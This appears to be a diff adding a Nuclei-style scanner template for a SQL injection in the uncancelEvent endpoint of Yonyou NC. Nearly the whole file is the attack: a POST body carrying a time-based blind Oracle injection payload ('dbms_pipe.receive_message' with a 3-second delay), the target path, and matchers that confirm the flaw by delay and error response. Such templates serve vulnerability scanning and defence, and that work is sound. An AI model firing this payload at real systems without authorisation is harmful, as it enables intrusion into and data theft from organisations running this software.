@@ -1,0 +1,40 @@
+﻿id: yonyou-nc-uncancelEvent-sqli
+info:
+    author: onewin
+    description: 用友NC系统的uncancelEvent接口存在SQL注入漏洞，攻击者可利用此漏洞执行任意SQL命令
+    name: 用友NC uncancelEvent SQL注入漏洞
+    reference:
+        - https://example.com/yonyou-nc-sqli
+    severity: high
+    tags:
+        - 用友-U8
+        - 用友-NC-Cloud
+        - Yonyou-UFIDA-NC
+        - Yonyou-U8-Cloud
+        - 用友-nc
+        - Yonyou-UFIDA
+http:
+    - body: event_id=-1' AND 1=dbms_pipe.receive_message('RDS',3)--+#&startDate=2025-06-16 00:00:00&event_ts=2025-06-16 00:00:00
+      headers:
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: zh-CN,zh;q=0.9
+        Cache-Control: max-age=0
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: JSESSIONID=255CAD868C61636AFF6029E1356C6AFF.ncServer; JSESSIONID=55DEB927A6B17337DC1D14CB52C50B19.ncServer
+        Upgrade-Insecure-Requests: "1"
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
+      matchers:
+        - dsl:
+            - duration>=3 && duration<8
+          type: dsl
+        - part: body
+          type: word
+          words:
+            - title>Error
+        - status:
+            - 500
+          type: status
+      matchers-condition: and
+      method: POST
+      path:
+        - '{{BaseURL}}/portal/pt/oacoSchedulerEvents/uncancelEvent?pageId=login'
